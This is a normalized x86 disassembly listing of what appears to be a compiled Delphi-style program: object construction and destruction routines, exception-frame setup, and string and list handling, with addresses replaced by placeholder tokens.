add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
retn
inc esp
clc
dec [ ebx - 0x4d0f7426 ]
add [ ecx + r-xdata ] esp
call sub_4032ec
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
jb r-xdata
je r-xdata
dec eax
add [ eax + eax ] cl
add [ eax ] al
enter 0x4832 0x0
dec esp
xor eax 0x35580040
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ edx ] bl
inc ebp
dec ecx
inc ebx
popad
outsb
dec esi
outsd
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
lea eax [ eax ]
add [ fs : eax ] al
add bh bh
insb
je r-xdata
jb r-xdata
add [ fs : eax ] al
add [ eax ] al
outsb
popad
je r-xdata
add [ eax ] al
add bh bh
dec ebp
sub_483408
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_483444
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_40331c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40330c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_483474
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
call sub_4045c8
xor eax eax
push ebp
push sub_483518
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_408064
push 0x1
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
mov cl 0x1
mov edx r-xdata
call sub_47423c
mov eax [ ebp - 0x8 ]
call sub_4043d8
test eax eax
jle r-xdata
mov eax ebx
mov edx [ ebp - 0x8 ]
call sub_40416c
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x22
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x1
mov edx 0x1
call sub_404678
push 0x1
push ebx
lea eax [ ebp - 0x8 ]
mov cl 0x1
mov edx r-xdata
call sub_47423c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48351f
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_40413c
retn
sub_483544
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax esi
call sub_404118
pop esi
pop ebx
retn
mov ecx esi
xor edx edx
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
pop esi
pop ebx
retn
sub_48357c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4045c8
xor eax eax
push ebp
push sub_48360a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_4043d8
test eax eax
jle r-xdata
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax [ ebx + 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_408248
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_483611
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40413c
retn
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax [ ebx + 0x4 ]
mov esi [ eax ]
call [ esi + 0x60 ]
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0x8 ] 0x1
jmp r-xdata
sub_483618
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4836a1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403264
mov edi eax
mov eax esi
call sub_403264
cmp edi eax
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4837a8
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_483814
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_4837e4
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_483848
mov edx [ esi + 0x24 ]
mov eax [ ebx + 0x24 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx esi
mov eax ebx
call sub_4192f4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4836a8
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40413c
retn
sub_4836b0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_48374b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
call sub_403264
cmp eax [ r-xdata ]
jne r-xdata
add esp 0xfffffff0
call sub_403668
mov ecx esi
xor edx edx
mov eax edi
call sub_41964c
mov [ edi + 0x2c ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_477ee0
mov [ edi + 0x28 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_477ee0
mov [ edi + 0x24 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_483752
lea eax [ ebp - 0x4 ]
call sub_404118
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
sub_483752
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_483770
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_40331c
mov eax [ esi + 0x24 ]
call sub_40331c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419684
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_483880
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_48392a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403264
mov edi eax
mov eax esi
call sub_403264
cmp edi eax
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4837a8
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_483814
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_4837e4
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_483848
mov edx [ esi + 0x24 ]
mov eax [ ebx + 0x24 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
lea edx [ ebp - 0xc ]
mov eax esi
call sub_483a6c
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_483aa0
lea eax [ ebx + 0x48 ]
mov edx [ esi + 0x48 ]
call sub_40416c
mov edx esi
mov eax ebx
call sub_483618
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_483931
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_40413c
retn
sub_483938
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_4839a5
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_4836b0
lea eax [ ebx + 0x38 ]
mov edx esi
call sub_40416c
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_408abc
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x48 ]
call sub_40416c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4839ac
lea eax [ ebp - 0x8 ]
call sub_404118
retn
add esp 0xfffffff0
call sub_403668
sub_4839ac
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_4839d0
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
cmp [ esi + 0x44 ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_483770
test bl bl
jle r-xdata
mov eax [ esi + 0x48 ]
call sub_408a24
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_483a04
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x24 ]
mov eax [ eax + 0x4 ]
xor ecx ecx
mov dl 0x1
call [ eax + 0x2c ]
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_483a60
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
add eax 0x68
mov edx [ ebx + 0x48 ]
call sub_40416c
mov edx [ ebx + 0x38 ]
mov ecx esi
mov eax [ ebp - 0x4 ]
call sub_47ef18
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_483a67
mov eax [ ebp - 0x4 ]
call sub_40331c
retn
sub_483acc
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_483b60
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403264
mov edi eax
mov eax esi
call sub_403264
cmp edi eax
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4837a8
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_483814
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_4837e4
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_483848
mov edx [ esi + 0x24 ]
mov eax [ ebx + 0x24 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx [ esi + 0x40 ]
mov eax [ ebx + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx esi
mov eax ebx
call sub_483618
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_483b67
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40413c
retn
sub_483b70
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov esi eax
mov edi [ ebp + 0x8 ]
xor edx edx
mov eax esi
call sub_4836b0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov ebx eax
mov [ esi + 0x40 ] ebx
test edi edi
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_483bd4
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
call sub_40331c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_483770
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_483c04
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_483cb6
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebx + 0x20 ] eax
xor eax eax
mov [ ebx + 0x28 ] eax
xor eax eax
mov [ ebx + 0x2c ] eax
mov eax ebx
call sub_419a38
mov edi eax
dec edi
test edi edi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_483cbd
lea eax [ ebp - 0x4 ]
call sub_404118
retn
inc edi
xor esi esi
mov edx esi
mov eax ebx
call sub_483d30
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
inc [ ebx + 0x2c ]
jmp r-xdata
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_483d30
mov eax [ eax + 0x24 ]
lea ecx [ ebp - 0x4 ]
mov edx r-xdata
call sub_478274
mov eax [ ebp - 0x4 ]
call sub_4043d8
test eax eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_483d30
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
inc [ ebx + 0x20 ]
inc [ ebx + 0x28 ]
sub_483cd8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ r-xdata ]
push eax
xor edx edx
mov eax esi
call sub_419d80
mov edx r-xdata
mov eax esi
call sub_483d44
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_483d44
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ r-xdata ]
call sub_47eda0
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0x1c ]
mov edx esi
call sub_40416c
pop esi
pop ebx
retn
sub_483d94
push ebx
mov ebx eax
mov eax [ ebx + 0x3c ]
call sub_419994
mov eax [ ebx + 0x30 ]
call sub_419994
xor eax eax
mov [ ebx + 0x50 ] eax
mov [ ebx + 0x54 ] eax
xor edx edx
mov eax [ ebx + 0x64 ]
call sub_476ed0
mov eax [ ebx + 0x78 ]
mov edx [ eax ]
call [ edx + 0x44 ]
lea eax [ ebx + 0x88 ]
call sub_404118
lea eax [ ebx + 0x9c ]
call sub_404118
mov eax [ ebx + 0xa0 ]
call sub_419994
lea eax [ ebx + 0x90 ]
call sub_404118
mov eax [ ebx + 0x98 ]
call sub_419994
mov [ ebx + 0x8c ] 0x2
xor edx edx
mov eax [ ebx + 0x94 ]
call sub_476ed0
lea eax [ ebx + 0x40 ]
call sub_404118
lea eax [ ebx + 0x38 ]
call sub_404118
lea eax [ ebx + 0x44 ]
call sub_404118
lea eax [ ebx + 0x48 ]
call sub_404118
xor edx edx
mov eax [ ebx + 0xa4 ]
call sub_476ed0
mov eax [ ebx + 0x68 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebx + 0x5c ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebx + 0x70 ]
call sub_4833fc
mov dl 0x1
mov eax ebx
call sub_484ce8
mov al [ r-xdata ]
mov [ ebx + 0x61 ] al
pop ebx
retn
sub_483e68
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_421a7c
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ esi + 0x34 ] eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4775e8
mov [ esi + 0x98 ] eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4775e8
mov [ esi + 0x30 ] eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4775e8
mov [ esi + 0x3c ] eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_483cd8
mov [ esi + 0x6c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ esi + 0x78 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_477ee0
mov [ esi + 0x68 ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41964c
mov [ esi + 0x64 ] eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4775e8
mov [ esi + 0xa0 ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41964c
mov [ esi + 0xa4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_477ee0
mov [ esi + 0x5c ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41964c
mov [ esi + 0x94 ] eax
mov [ esi + 0x7d ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_483408
mov [ esi + 0x70 ] eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
mov [ esi + 0x60 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_483f8c
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x34 ]
call sub_40331c
mov eax [ esi + 0x98 ]
call sub_40331c
mov eax [ esi + 0x30 ]
call sub_40331c
mov eax [ esi + 0x3c ]
call sub_40331c
mov eax [ esi + 0x6c ]
call sub_40331c
mov eax [ esi + 0x78 ]
call sub_40331c
mov eax [ esi + 0x68 ]
call sub_40331c
mov eax [ esi + 0x5c ]
call sub_40331c
mov eax [ esi + 0x64 ]
call sub_40331c
mov eax [ esi + 0xa0 ]
call sub_40331c
mov eax [ esi + 0xa4 ]
call sub_40331c
mov eax [ esi + 0x94 ]
call sub_40331c
mov eax [ esi + 0x70 ]
call sub_40331c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_421ac8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_484048
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_484404
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x6c ]
call sub_483c04
cmp [ ebx + 0x60 ] 0x0
jne r-xdata
mov eax [ ebx + 0x6c ]
cmp [ eax + 0x28 ] 0x0
jg r-xdata
mov eax [ ebx + 0x6c ]
mov eax [ eax + 0x24 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebx + 0x38 ]
call sub_4043d8
test eax eax
jle r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
cmp [ eax + 0x2c ] 0x0
jle r-xdata
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x9 ]
lea eax [ ebp - 0xa ]
call sub_47dcf4
lea eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x9 ]
lea edx [ ebp - 0xa ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x30 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_477ee0
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x68 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax [ ebx + 0x40 ]
call sub_4043d8
test eax eax
jne r-xdata
xor eax eax
push ebp
push sub_4843ca
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0x64 ]
mov cl [ ebp - 0xa ]
mov dl [ ebp - 0x9 ]
call sub_47d2f4
mov ecx [ ebp - 0x14 ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_478448
mov al [ ebp - 0xa ]
push eax
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebx + 0x90 ]
mov cl [ ebp - 0x9 ]
mov edx r-xdata
call sub_47e4bc
mov ecx [ ebp - 0x18 ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_478448
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebx + 0x98 ]
mov cl [ ebp - 0xa ]
mov dl [ ebp - 0x9 ]
call sub_47ddc0
mov ecx [ ebp - 0x1c ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_478448
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebx + 0x3c ]
mov cl [ ebp - 0xa ]
mov dl [ ebp - 0x9 ]
call sub_47ddc0
mov ecx [ ebp - 0x20 ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_478448
lea edx [ ebp - 0x24 ]
mov eax [ ebx + 0x78 ]
call sub_41a294
mov ecx [ ebp - 0x24 ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_478448
cmp [ ebx + 0x60 ] 0x0
jne r-xdata
mov edx [ ebx + 0x68 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
push [ ebx + 0x40 ]
push r-xdata
push r-xdata
push r-xdata
push r-xdata
push [ ebx + 0x38 ]
push r-xdata
lea eax [ ebx + 0x40 ]
mov edx 0x7
call sub_404498
jmp r-xdata
push r-xdata
push [ ebx + 0x38 ]
push r-xdata
lea eax [ ebx + 0x40 ]
mov edx 0x3
call sub_404498
jmp r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebx + 0xa4 ]
call sub_476c60
mov ecx [ ebp - 0x28 ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_478448
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0xa0 ]
mov cl [ ebp - 0xa ]
mov dl [ ebp - 0x9 ]
call sub_47ddc0
mov ecx [ ebp - 0x2c ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_478448
mov al [ ebp - 0xa ]
push eax
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebx + 0x88 ]
mov cl [ ebp - 0x9 ]
mov edx r-xdata
call sub_47e4bc
mov ecx [ ebp - 0x30 ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_478448
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebx + 0x94 ]
mov cl [ ebp - 0xa ]
mov dl [ ebp - 0x9 ]
call sub_47d2f4
mov ecx [ ebp - 0x34 ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_478448
mov ecx [ ebx + 0x9c ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_478448
mov eax ebx
call sub_484cd0
test al al
je r-xdata
mov ecx [ ebx + 0x40 ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_478448
mov eax [ ebx + 0x6c ]
call sub_419a38
test eax eax
jle r-xdata
push [ ebx + 0x54 ]
push [ ebx + 0x50 ]
lea edx [ ebp - 0x3c ]
xor eax eax
call sub_473bfc
mov ecx [ ebp - 0x3c ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_478448
call sub_409f64
add esp 0xfffffff8
fstp [ esp ]
fwait
lea edx [ ebp - 0x38 ]
xor eax eax
call sub_473bfc
mov ecx [ ebp - 0x38 ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_478448
jmp r-xdata
mov ecx [ ebx + 0x44 ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_478448
mov ecx r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_478448
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebx + 0x5c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
lea edx [ ebp - 0x40 ]
xor eax eax
mov al [ ebx + 0x8c ]
inc eax
call sub_40850c
mov ecx [ ebp - 0x40 ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_478448
mov ecx r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_478448
mov eax [ ebx + 0x5c ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48440b
lea eax [ ebp - 0x40 ]
mov edx 0xd
call sub_40413c
lea eax [ ebp - 0x8 ]
call sub_404118
retn
sub_4845ec
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4045c8
xor eax eax
push ebp
push sub_4846bc
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4080a0
mov edx [ ebp - 0xc ]
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov eax r-xdata
call ebx
test eax eax
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4080a0
mov edx [ ebp - 0x10 ]
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov eax r-xdata
call ebx
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_408280
push 0x1
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x8 ]
mov cl 0x1
mov edx r-xdata
call sub_47423c
mov eax [ ebp - 0x18 ]
lea edx [ ebp - 0x14 ]
call sub_408280
mov edx [ ebp - 0x14 ]
lea eax [ ebp - 0x8 ]
call sub_4041b0
mov edx 0x3
mov eax [ ebp - 0x8 ]
call sub_408684
mov ebx eax
dec ebx
mov bl 0x3
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4846c3
lea eax [ ebp - 0x18 ]
mov edx 0x6
call sub_40413c
retn
sub_484700
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_4847de
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_408064
push 0x1
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_47423c
lea eax [ ebp - 0xc ]
push eax
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404638
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404524
jne r-xdata
push 0x1
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_47423c
mov edx [ ebp - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x38
call sub_40416c
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx 0x1
call sub_404678
push 0x1
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_47423c
mov edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x38
call sub_40416c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4847e5
lea eax [ ebp - 0x14 ]
mov edx 0x5
call sub_40413c
retn
sub_484818
push ebp
mov ebp esp
mov ecx 0xd
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_484b31
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
mov eax [ ebx ]
mov eax [ eax + 0x68 ]
mov edx r-xdata
call sub_478274
mov edx [ ebp - 0xc ]
mov eax [ ebx ]
add eax 0x40
call sub_40416c
push ebp
call sub_484700
pop ecx
lea ecx [ ebp - 0x10 ]
mov eax [ ebx ]
mov eax [ eax + 0x68 ]
mov edx r-xdata
call sub_478274
mov edx [ ebp - 0x10 ]
mov eax [ ebx ]
add eax 0x44
call sub_40416c
lea ecx [ ebp - 0x14 ]
mov eax [ ebx ]
mov eax [ eax + 0x68 ]
mov edx r-xdata
call sub_478274
mov edx [ ebp - 0x14 ]
mov eax [ ebx ]
add eax 0x48
call sub_40416c
lea ecx [ ebp - 0x1c ]
mov eax [ ebx ]
mov eax [ eax + 0x68 ]
mov edx r-xdata
call sub_478274
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x18 ]
call sub_47d5b4
mov edx [ ebp - 0x18 ]
mov eax [ ebx ]
add eax 0x90
call sub_40416c
lea ecx [ ebp - 0x24 ]
mov eax [ ebx ]
mov eax [ eax + 0x68 ]
mov edx r-xdata
call sub_478274
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_47d5b4
mov edx [ ebp - 0x20 ]
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
call sub_476ed0
lea ecx [ ebp - 0x28 ]
mov eax [ ebx ]
mov eax [ eax + 0x68 ]
mov edx r-xdata
call sub_478274
mov edx [ ebp - 0x28 ]
mov eax [ ebx ]
add eax 0x74
call sub_40416c
lea ecx [ ebp - 0x2c ]
mov eax [ ebx ]
mov eax [ eax + 0x68 ]
mov edx r-xdata
call sub_478274
